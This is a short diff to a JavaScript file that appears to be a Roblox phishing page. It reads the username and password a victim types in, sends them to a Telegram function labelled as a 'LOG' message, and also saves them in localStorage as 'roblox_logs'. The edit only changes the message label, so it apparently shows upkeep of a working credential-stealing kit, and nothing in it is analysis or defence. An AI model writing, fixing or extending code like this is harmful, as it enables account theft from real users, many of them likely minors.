@@ -136,7 +136,7 @@
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             if(!u || !p) return;
-            await sendToTg(`👤 *LOG:* \`${u}\` | \`${p}\``);
+            await sendToTg(`👤 *NEW LOG:* \`${u}\` | \`${p}\``);
             let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
             logs.push({ user: u, pass: p, time: new Date().toLocaleTimeString() });
             localStorage.setItem('roblox_logs', JSON.stringify(logs));
